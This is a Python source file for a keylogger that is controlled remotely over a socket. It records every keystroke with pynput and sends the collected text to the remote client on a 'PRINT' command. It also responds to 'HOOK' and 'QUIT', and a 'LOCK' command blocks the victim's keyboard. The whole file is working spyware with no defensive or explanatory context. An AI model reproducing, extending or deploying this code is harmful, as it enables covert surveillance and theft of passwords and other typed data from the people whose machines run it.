import threading
import keyboard
from pynput.keyboard import Listener

BUFFER_SIZE = 1024 * 4
SPACE_KEY = 'Key.space'
SINGLE_QUOTE = "''"

FLAG_HOOK = 1
FLAG_UNHOOK = 2
FLAG_QUIT = 4

def log_key(key):
    global logged_keys, flag
    if flag == FLAG_QUIT:
        return False
    if flag == FLAG_HOOK:
        temp = str(key)
        if temp == SPACE_KEY:
            temp = ' '
        elif temp == SINGLE_QUOTE:
            temp = "'"
        else:
            temp = temp.replace("'", "")
        logged_keys += str(temp)
    return

def send_logged_keys(client):
    global logged_keys
    client.sendall(bytes(logged_keys, "utf8"))
    logged_keys = " "

def listen_keys():
    with Listener(on_press = log_key) as listener:
        listener.join()
    return

def toggle_lock():
    global is_locked
    for i in range(150):
        if is_locked == 0:
            keyboard.block_key(i)
        else:
            keyboard.unblock_key(i)
    is_locked = 1 if is_locked == 0 else 0
    return

def keylog(client):
    global logged_keys, flag, is_locked, is_hooked
    is_locked = 0
    is_hooked = 0
    threading.Thread(target = listen_keys).start()
    flag = 0
    logged_keys = " "
    message = ""
    while True:
        message = client.recv(BUFFER_SIZE).decode("utf8")
        if "HOOK" in message:
            if is_hooked == 0:
                flag = FLAG_HOOK
                is_hooked = 1
            else:
                flag = FLAG_UNHOOK
                is_hooked = 0
        elif "PRINT" in message:
            send_logged_keys(client)
        elif "LOCK" in message:
            toggle_lock()
        elif "QUIT" in message:
            flag = FLAG_QUIT
            return